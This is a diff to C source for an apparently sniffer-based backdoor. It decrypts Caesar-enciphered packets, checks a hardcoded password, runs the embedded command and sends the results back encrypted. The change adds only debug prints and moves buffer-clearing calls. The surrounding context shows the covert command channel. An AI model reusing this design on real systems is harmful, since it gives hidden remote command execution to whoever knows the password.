@@ -79,7 +79,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	int size_tcp;
 	//int size_payload;
 	int mode;
-
+	printf("Packet received\n");
 	char password[strlen(PASSWORD) + 1];
 	char decrypted[PKT_SIZE];
 	char * command;
@@ -116,16 +116,17 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	/* Decrypt the payload */
 	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));
 
-	memset(password, 0, sizeof(password));
 	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
 	{
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
-	// If there happens to be some garbled letters in the decrypted, return immediately
+	// If there happens to be some garbled letters in the decrypted buffer, return immediately
 	if(strcmp(decrypted, password) == 0)
 		return;
 
+	printf("Decrypted: %s\n", decrypted);
+	printf("Password: %s\n", password);
 	command = parse_cmd(decrypted);
 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
@@ -144,6 +145,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "Incorrect Password\n");
 	}
 	memset(decrypted, 0, sizeof(decrypted));
+	memset(password, 0, sizeof(password));
 	return;
 
 }
@@ -190,7 +192,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	{
 		//Format packet payload
 		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
-		
+		printf("Packet: %s\n", packet);
 		//Encrypt payload
 		strcpy(encrypted, ConvertCaesar(mEncipher, packet, MOD, START));
 		
@@ -201,11 +203,5 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
 	}
-
-	memset(encrypted, 0, sizeof(encrypted));
-	memset(packet, 0, sizeof(packet));
-	memset(cmd_results, 0, sizeof(cmd_results));
-	memset(src, 0, sizeof(src));
-	memset(dst, 0, sizeof(dst));
 	return 0;
 }
